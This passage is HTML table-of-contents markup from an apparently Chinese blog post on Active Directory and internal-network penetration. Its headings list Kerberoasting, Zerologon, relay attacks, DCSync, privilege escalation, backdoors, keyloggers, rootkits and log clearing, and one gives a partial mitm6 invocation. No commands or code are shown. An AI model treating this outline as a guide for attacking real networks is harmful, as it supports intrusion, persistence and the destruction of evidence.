href="#%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.0.0.0.10.</span> <span class="toc-text"> 地址解析协议</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#zerologon%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.0.0.0.11.</span> <span class="toc-text"> zerologon 漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#cve-2021-42278-cve-2021-42287"><span class="toc-number">3.0.0.0.12.</span> <span class="toc-text"> CVE-2021-42278 &amp;&amp; CVE-2021-42287</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4%E5%88%97%E5%87%BA%E5%8F%AF%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE%E7%9A%84smb%E5%85%B1%E4%BA%AB"><span class="toc-number">4.</span> <span class="toc-text"> 4. 列出可匿名访问的 SMB 共享</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5%E6%9E%9A%E4%B8%BEldap"><span class="toc-number">5.</span> <span class="toc-text"> 5. 枚举 LDAP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6%E6%9F%A5%E6%89%BE%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">6.</span> <span class="toc-text"> 6. 查找用户名</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%97%E5%88%B0%E8%B4%A6%E5%8F%B7%E4%BD%86%E6%98%AF%E6%B2%A1%E6%9C%89%E5%AF%86%E7%A0%81"><span class="toc-number">6.1.</span> <span class="toc-text"> 得到账号，但是没有密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-number">6.1.1.</span> <span class="toc-text"> 密码喷洒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#asrep-roasting%E6%94%BB%E5%87%BB"><span class="toc-number">6.1.2.</span> <span class="toc-text"> ASREP-Roasting 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96hash"><span class="toc-number">6.1.2.1.</span> <span class="toc-text"> 获取 hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96asrep-roastable%E8%B4%A6%E5%8F%B7"><span class="toc-number">6.1.2.2.</span> <span class="toc-text"> 获取 ASREP-Roastable 账号</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0%E4%BB%BB%E6%84%8F%E4%B8%80%E4%B8%AA%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-number">6.2.</span> <span class="toc-text"> 拿到任意一个域用户的账号密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%85%B6%E4%BB%96%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">6.2.1.</span> <span class="toc-text"> 获取其他账户密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E6%89%80%E6%9C%89%E8%B4%A6%E6%88%B7%E5%90%8D"><span class="toc-number">6.2.1.1.</span> <span class="toc-text"> 1. 获取域内所有账户名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E6%9E%9A%E4%B8%BE-smb-%E5%85%B1%E4%BA%AB"><span class="toc-number">6.2.1.2.</span> <span class="toc-text"> 2. 枚举 SMB 共享</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3bloodhound"><span class="toc-number">6.2.1.3.</span> <span class="toc-text"> 3.bloodhound</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4powerview-pywerview"><span class="toc-number">6.2.1.4.</span> <span class="toc-text"> 4.powerview &#x2F; pywerview</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberoasting%E6%94%BB%E5%87%BB"><span class="toc-number">6.2.2.</span> <span class="toc-text"> Kerberoasting 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96hash-2"><span class="toc-number">6.2.2.1.</span> <span class="toc-text"> 获取 hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE-kerberoastable-%E8%B4%A6%E5%8F%B7"><span class="toc-number">6.2.2.2.</span> <span class="toc-text"> 查找 kerberoastable 账号</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ms14-068"><span class="toc-number">6.2.3.</span> <span class="toc-text"> MS14-068</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#printnightmare"><span class="toc-number">6.2.4.</span> <span class="toc-text"> PrintNightmare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE-dns-%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">6.2.5.</span> <span class="toc-text"> 枚举 DNS 服务器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7relaypoisoning%E6%94%BB%E5%87%BB"><span class="toc-number">7.</span> <span class="toc-text"> 7.relay&#x2F;poisoning 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E6%B2%A1%E5%BC%80%E5%90%AFsmb%E7%AD%BE%E5%90%8D%E7%9A%84%E6%9C%BA%E5%99%A8"><span class="toc-number">7.0.1.</span> <span class="toc-text"> 扫描没开启 SMB 签名的机器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#petitpotam"><span class="toc-number">7.0.2.</span> <span class="toc-text"> PetitPotam</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%91%E5%90%AC"><span class="toc-number">7.0.3.</span> <span class="toc-text"> 监听</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0smb%E7%AD%BE%E5%90%8D-%E5%BC%80%E5%90%AFipv6-adcs"><span class="toc-number">7.1.</span> <span class="toc-text"> 无 SMB 签名 || 开启 IPv6 || ADCS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1ms08-068"><span class="toc-number">7.1.1.</span> <span class="toc-text"> 1.MS08-068</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2mitm6-i-eth0-d-domain"><span class="toc-number">7.1.2.</span> <span class="toc-text"> 2.mitm6 -i eth0 -d </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3adcs"><span class="toc-number">7.1.3.</span> <span class="toc-text"> 3.adcs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0hash%E7%A0%B4%E8%A7%A3"><span class="toc-number">7.2.</span> <span class="toc-text"> 拿到 hash 破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1lm"><span class="toc-number">7.2.0.1.</span> <span class="toc-text"> 1.LM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2ntlm"><span class="toc-number">7.2.0.2.</span> <span class="toc-text"> 2.NTLM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3ntlmv1"><span class="toc-number">7.2.0.3.</span> <span class="toc-text"> 3.NTLMv1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4ntlmv2"><span class="toc-number">7.2.0.4.</span> <span class="toc-text"> 4.NTLMv2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5kerberos-5-tgs"><span class="toc-number">7.2.0.5.</span> <span class="toc-text"> 5.Kerberos 5 TGS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6kerberos-asrep"><span class="toc-number">7.2.0.6.</span> <span class="toc-text"> 6.Kerberos ASREP</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">8.</span> <span class="toc-text"> 9. 横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1pth"><span class="toc-number">8.1.</span> <span class="toc-text"> 1.PTH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2ptk"><span class="toc-number">8.2.</span> <span class="toc-text"> 2.PTK</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">8.3.</span> <span class="toc-text"> 3. 非约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%A5%A8%E6%8D%AE"><span class="toc-number">8.3.1.</span> <span class="toc-text"> 获取票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E4%B8%BB%E6%9C%BA"><span class="toc-number">8.3.2.</span> <span class="toc-text"> 查找非约束委派主机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">8.4.</span> <span class="toc-text"> 4. 约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%A5%A8%E6%8D%AE-2"><span class="toc-number">8.4.1.</span> <span class="toc-text"> 获取票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E4%B8%BB%E6%9C%BA"><span class="toc-number">8.4.2.</span> <span class="toc-text"> 查找约束委派主机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">8.5.</span> <span class="toc-text"> 5. 基于资源的约束委派</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6dcsync"><span class="toc-number">8.6.</span> <span class="toc-text"> 6.dcsync</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E6%89%93%E5%8D%B0%E6%9C%BA-spoolservice-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">8.7.</span> <span class="toc-text"> 7. 打印机 SpoolService 漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8ad%E5%9F%9Facl%E6%94%BB%E5%87%BBaclpwnpy"><span class="toc-number">8.8.</span> <span class="toc-text"> 8.AD 域 ACL 攻击 (aclpwn.py)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9%E8%8E%B7%E5%8F%96laps%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81"><span class="toc-number">8.9.</span> <span class="toc-text"> 9. 获取 LAPS 管理员密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10privexchange%E6%BC%8F%E6%B4%9E"><span class="toc-number">8.10.</span> <span class="toc-text"> 10.privexchange 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#exchange%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">8.10.0.0.1.</span> <span class="toc-text"> Exchange 的利用</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11ipc"><span class="toc-number">8.11.</span> <span class="toc-text"> 11.IPC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12%E5%85%B6%E4%BB%96%E6%A8%AA%E7%A7%BB"><span class="toc-number">8.12.</span> <span class="toc-text"> 12. 其他横移</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">9.</span> <span class="toc-text"> 10. 权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90"><span class="toc-number">9.1.</span> <span class="toc-text"> 拿到域控权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E5%90%8E%E9%97%A8"><span class="toc-number">9.2.</span> <span class="toc-text"> Windows 后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E5%90%8E%E9%97%A8"><span class="toc-number">9.3.</span> <span class="toc-text"> Linux 后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB"><span class="toc-number">9.4.</span> <span class="toc-text"> 域信任关系</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E6%94%BB%E5%87%BB%E7%88%B6%E5%9F%9F-sid-history%E7%89%88%E8%B7%A8%E5%9F%9F%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">9.4.1.</span> <span class="toc-text"> 子域攻击父域 - SID History 版跨域黄金票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%AF%86%E9%92%A5%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E5%9F%9F%E7%9A%84%E6%9D%83%E9%99%90-%E4%BF%A1%E4%BB%BB%E7%A5%A8%E6%8D%AE"><span class="toc-number">9.4.2.</span> <span class="toc-text"> 利用域信任密钥获取目标域的权限 - 信任票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%85%B6%E5%AE%83%E6%9E%97"><span class="toc-number">9.4.3.</span> <span class="toc-text"> 攻击其它林</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E6%8C%81%E4%B9%85%E6%80%A7%E6%8A%80%E5%B7%A7"><span class="toc-number">9.5.</span> <span class="toc-text"> 活动目录持久性技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#security-support-provider"><span class="toc-number">9.5.0.0.1.</span> <span class="toc-text"> Security Support Provider</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sid-history"><span class="toc-number">9.5.0.0.2.</span> <span class="toc-text"> SID History</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#adminsdholdersdprop"><span class="toc-number">9.5.0.0.3.</span> <span class="toc-text"> AdminSDHolder＆SDProp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#dcsync%E5%90%8E%E9%97%A8"><span class="toc-number">9.5.0.0.4.</span> <span class="toc-text"> Dcsync 后门</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5"><span class="toc-number">9.5.0.0.5.</span> <span class="toc-text"> 组策略</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#hook-passwordchangenotify"><span class="toc-number">9.5.0.0.6.</span> <span class="toc-text"> Hook PasswordChangeNotify</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#kerberoasting%E5%90%8E%E9%97%A8"><span class="toc-number">9.5.0.0.7.</span> <span class="toc-text"> Kerberoasting 后门</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#adminsdholder"><span class="toc-number">9.5.0.0.8.</span> <span class="toc-text"> AdminSDHolder</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#delegation"><span class="toc-number">9.5.0.0.9.</span> <span class="toc-text"> Delegation</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="toc-number">10.</span> <span class="toc-text"> 11. 敏感文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-2"><span class="toc-number">10.1.</span> <span class="toc-text"> windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux-2"><span class="toc-number">10.2.</span> <span class="toc-text"> Linux</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#12%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">11.</span> <span class="toc-text"> 12. 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-3"><span class="toc-number">11.1.</span> <span class="toc-text"> Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-uac"><span class="toc-number">11.1.1.</span> <span class="toc-text"> bypass UAC</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">11.1.1.0.1.</span> <span class="toc-text"> 常用方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">11.1.1.0.2.</span> <span class="toc-text"> 常用工具</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-2"><span class="toc-number">11.1.1.1.</span> <span class="toc-text"> 提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux-3"><span class="toc-number">11.2.</span> <span class="toc-text"> Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83"><span class="toc-number">11.2.0.1.</span> <span class="toc-text"> 内核溢出提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">11.2.0.2.</span> <span class="toc-text"> 计划任务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#suid"><span class="toc-number">11.2.0.3.</span> <span class="toc-text"> SUID</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">11.2.0.4.</span> <span class="toc-text"> 环境变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%94%99%E8%AF%AF%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">11.2.0.5.</span> <span class="toc-text"> 系统服务的错误权限配置漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2021-4034"><span class="toc-number">11.2.0.6.</span> <span class="toc-text"> CVE-2021-4034</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE"><span class="toc-number">11.2.0.7.</span> <span class="toc-text"> 不安全的文件 &#x2F; 文件夹权限配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E5%AD%98%E5%82%A8%E7%9A%84%E6%98%8E%E6%96%87%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81"><span class="toc-number">11.2.0.8.</span> <span class="toc-text"> 找存储的明文用户名，密码</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#13%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">12.</span> <span class="toc-text"> 13. 权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-4"><span class="toc-number">12.1.</span> <span class="toc-text"> Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%AF%86%E7%A0%81%E8%AE%B0%E5%BD%95%E5%B7%A5%E5%85%B7"><span class="toc-number">12.1.0.0.1.</span> <span class="toc-text"> 1、密码记录工具</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%B8%B8%E7%94%A8%E7%9A%84%E5%AD%98%E5%82%A8payload%E4%BD%8D%E7%BD%AE"><span class="toc-number">12.1.0.0.2.</span> <span class="toc-text"> 2、常用的存储 Payload 位置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-runrunonce-keys"><span class="toc-number">12.1.0.0.3.</span> <span class="toc-text"> 3、Run&#x2F;RunOnce Keys</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-bootexecute-key"><span class="toc-number">12.1.0.0.4.</span> <span class="toc-text"> 4、BootExecute Key</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-userinit-key"><span class="toc-number">12.1.0.0.5.</span> <span class="toc-text"> 5、Userinit Key</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-startup-keys"><span class="toc-number">12.1.0.0.6.</span> <span class="toc-text"> 6、Startup Keys</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7-services"><span class="toc-number">12.1.0.0.7.</span> <span class="toc-text"> 7、Services</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#8-browser-helper-objects"><span class="toc-number">12.1.0.0.8.</span> <span class="toc-text"> 8、Browser Helper Objects</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#9-appinit_dlls"><span class="toc-number">12.1.0.0.9.</span> <span class="toc-text"> 9、AppInit_DLLs</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#10-%E6%96%87%E4%BB%B6%E5%85%B3%E8%81%94"><span class="toc-number">12.1.0.0.10.</span> <span class="toc-text"> 10、文件关联</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#11-bitsadmin"><span class="toc-number">12.1.0.0.11.</span> <span class="toc-text"> 11、bitsadmin</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#12-mof"><span class="toc-number">12.1.0.0.12.</span> <span class="toc-text"> 12、mof</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#13-wmi"><span class="toc-number">12.1.0.0.13.</span> <span class="toc-text"> 13、wmi</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#14-userland-persistence-with-scheduled-tasks"><span class="toc-number">12.1.0.0.14.</span> <span class="toc-text"> 14、Userland Persistence With Scheduled Tasks</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#15-netsh"><span class="toc-number">12.1.0.0.15.</span> <span class="toc-text"> 15、Netsh</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#16-shim"><span class="toc-number">12.1.0.0.16.</span> <span class="toc-text"> 16、Shim</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#17-dll%E5%8A%AB%E6%8C%81"><span class="toc-number">12.1.0.0.17.</span> <span class="toc-text"> 17、DLL 劫持</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#18-doubleagent"><span class="toc-number">12.1.0.0.18.</span> <span class="toc-text"> 18、DoubleAgent</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#19-waitforexe"><span class="toc-number">12.1.0.0.19.</span> <span class="toc-text"> 19、waitfor.exe</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#20-appdomainmanager"><span class="toc-number">12.1.0.0.20.</span> <span class="toc-text"> 20、AppDomainManager</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#21-office"><span class="toc-number">12.1.0.0.21.</span> <span class="toc-text"> 21、Office</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#22-clr"><span class="toc-number">12.1.0.0.22.</span> <span class="toc-text"> 22、CLR</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#23-msdtc"><span class="toc-number">12.1.0.0.23.</span> <span class="toc-text"> 23、msdtc</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#24-hijack-caccpropservicesclass-and-mmdeviceenumerato"><span class="toc-number">12.1.0.0.24.</span> <span class="toc-text"> 24、Hijack CAccPropServicesClass and MMDeviceEnumerato</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#25-hijack-explorerexe"><span class="toc-number">12.1.0.0.25.</span> <span class="toc-text"> 25、Hijack explorer.exe</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#26-windows-fax-dll-injection"><span class="toc-number">12.1.0.0.26.</span> <span class="toc-text"> 26、Windows FAX DLL Injection</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#27-%E7%89%B9%E6%AE%8A%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE%E5%80%BC"><span class="toc-number">12.1.0.0.27.</span> <span class="toc-text"> 27、特殊注册表键值</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#28-%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E5%90%8E%E9%97%A8"><span class="toc-number">12.1.0.0.28.</span> <span class="toc-text"> 28、快捷方式后门</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#29-logon-scripts"><span class="toc-number">12.1.0.0.29.</span> <span class="toc-text"> 29、Logon Scripts</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#30-password-filter-dll"><span class="toc-number">12.1.0.0.30.</span> <span class="toc-text"> 30、Password Filter DLL</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#31-%E5%88%A9%E7%94%A8bho%E5%AE%9E%E7%8E%B0ie%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81"><span class="toc-number">12.1.0.0.31.</span> <span class="toc-text"> 31、利用 BHO 实现 IE 浏览器劫持</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux-4"><span class="toc-number">12.2.</span> <span class="toc-text"> Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#crontab"><span class="toc-number">12.2.0.0.1.</span> <span class="toc-text"> crontab</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A1%AC%E9%93%BE%E6%8E%A5sshd"><span class="toc-number">12.2.0.0.2.</span> <span class="toc-text"> 硬链接 sshd</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ssh-server-wrapper"><span class="toc-number">12.2.0.0.3.</span> <span class="toc-text"> SSH Server wrapper</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ssh-keylogger"><span class="toc-number">12.2.0.0.4.</span> <span class="toc-text"> SSH keylogger</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#cymothoa_%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5backdoor"><span class="toc-number">12.2.0.0.5.</span> <span class="toc-text"> Cymothoa_进程注入 backdoor</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#rootkit"><span class="toc-number">12.2.0.0.6.</span> <span class="toc-text"> rootkit</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#tools"><span class="toc-number">12.2.0.0.7.</span> <span class="toc-text"> Tools</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#14%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="toc-number">13.</span> <span class="toc-text"> 14. 痕迹清理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#windows%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4"><span class="toc-number">13.0.1.</span> <span class="toc-text"> Windows 日志清除</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E5%9D%8Fwindows%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E5%8A%9F%E8%83%BD"><span class="toc-number">13.0.2.</span> <span class="toc-text"> 破坏 Windows 日志记录功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#metasploit"><span class="toc-number">13.0.3.</span> <span class="toc-text"> Metasploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3389%E7%99%BB%E9%99%86%E8%AE%B0%E5%BD%95%E6%B8%85%E9%99%A4"><span class="toc-number">13.0.4.</span> <span class="toc-text"> 3389 登陆记录清除</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#15%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">14.</span> <span class="toc-text"> 15. 内网穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-%E5%9C%BA%E6%99%AF%E4%B8%8E%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90"><span class="toc-number">14.0.0.1.</span> <span class="toc-text"> 0x01 场景与思路分析</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%80%E5%86%85%E7%BD%91%E9%98%B2%E7%81%AB%E5%A2%99%E5%AF%B9%E5%87%BA%E5%8F%A3%E6%B5%81%E9%87%8F%E6%B2%A1%E6%9C%89%E4%BB%BB%E4%BD%95%E7%AB%AF%E5%8F%A3%E9%99%90%E5%88%B6"><span class="toc-number">14.0.0.1.0.1.</span> <span class="toc-text"> 